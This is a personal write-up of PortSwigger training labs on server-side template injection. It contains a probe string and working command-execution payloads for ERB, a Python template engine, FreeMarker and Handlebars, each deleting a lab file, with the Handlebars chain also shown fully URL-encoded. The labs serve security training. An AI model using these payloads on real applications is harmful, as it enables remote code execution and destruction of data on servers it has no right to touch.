# SSTI (Template Injection)

Templates are used for emails, invoices, creating pdf files or anything that needs a standardized format really. The content of an error message could well be created via template. If we can inject data into this template where input data is being used to perform an action, then we achieve SSTI

Most times, using an invalid payload helps identify template used via error message

`${{<%[%'"}}%.`

This will brick it for sure, finetune it to generate a desirable output

## PortSwigger Labs

### Lab 1 (Basic)

It's important to find which parameter is vulnerable in the first place, I looked at the product viewing URL but the first item was out of stock and sent an error message.

Challenge mentions ERB by Ruby is used, Payloadallthethings

<div align="left"><figure><img src="../../.gitbook/assets/image (20).png" alt="" width="563"><figcaption></figcaption></figure></div>

`<%= 7 * 8 %>`

<div align="left"><figure><img src="../../.gitbook/assets/image (21).png" alt="" width="504"><figcaption><p>Find 56 in the response div</p></figcaption></figure></div>

`<%= system('rm /home/carlos/morale.txt') %>`

<div align="left"><figure><img src="../../.gitbook/assets/image (22).png" alt="" width="249"><figcaption></figcaption></figure></div>

### Lab 2 (Code context)

In account settings, we have option choose how our Username to be displayed, this setting is used when displaying our names in comments on blogs.

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

`{%import os%} {{os.system('rm /home/carlos/morale.txt')`

Using double curly braces for importing OS was the mistake, don't forget to URL encode if it dont work

In first lab we overwrote entire input field, this we appending like SQLi which is why end braces are omitted at the end.

### Lab 3 (Unknown Language)

Using {$var} and ${var} are two completely different things, the latter only triggers an error

<div align="left"><figure><img src="../../.gitbook/assets/image (25).png" alt="" width="563"><figcaption></figcaption></figure></div>

We are able to edit template used for product description, using an undefined variable produces an error and see freemarker by java is used, once you figure out what's being used everything is documented online

`${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`

### Lab 4 (Unknown Language)

<div align="left"><figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure></div>

Handlebars JS template running, you know the rest. However, if encoding key characters doesn't work, encode all characters too just try it lol

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

turns to

```
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
